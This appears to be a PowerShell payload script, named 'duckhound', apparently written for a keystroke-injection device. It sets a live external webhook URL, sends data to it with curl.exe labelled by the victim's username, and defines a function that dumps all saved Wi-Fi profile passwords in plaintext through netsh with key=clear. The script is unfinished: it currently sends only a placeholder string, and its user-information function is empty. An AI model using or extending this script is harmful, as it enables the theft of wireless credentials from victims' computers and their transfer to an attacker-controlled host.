# duckhound webhook script
# created by : C0SM0 & I am Jakoby

# change me
$webhook = "https://us-central1-obsidian-buffer.cloudfunctions.net/webhook/332fa6cc28b71b33771831cd455417413351fdc033ba73c8"

# variables
$markdown = $env:userprofile.Split('\')[2] 

# send content to obsidian
function send_to_obsidian {
    
    # file parameter
    [CmdletBinding()]
    param (    
    [Parameter (Position=0,Mandatory = $True)]
    [string]$file
    )

    # curl requests
    curl.exe -d "hello world1" -H "Content-Type: text/plain" $webhook"?path=$file.md"
}

# mark wireless information
function wireless_markdown {
    # get wireless creds
    $creds = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
}

# mark user information
function user_markdown {

}


send_to_obsidian -file $markdown 
